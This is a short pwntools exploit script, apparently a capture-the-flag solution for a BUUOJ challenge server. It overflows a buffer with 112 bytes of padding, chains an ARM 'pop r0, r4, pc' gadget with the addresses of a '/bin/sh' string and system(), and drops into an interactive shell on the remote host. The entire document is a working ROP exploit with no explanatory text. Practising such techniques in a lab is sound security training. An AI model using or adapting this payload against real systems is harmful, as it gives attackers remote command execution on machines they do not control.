from pwn import *

io = remote("node4.buuoj.cn", 27106)

binsh = 0x0006c384
pop_r0_r4_pc = 0x00020904
system = 0x000110B4
# main = 0x8F00
payload = "a"*112 + p32(pop_r0_r4_pc) + p32(binsh)*2 + p32(system)

io.recvuntil("quit\n")
io.send("\n")

io.recvuntil("\n")
io.sendline(payload)


io.interactive()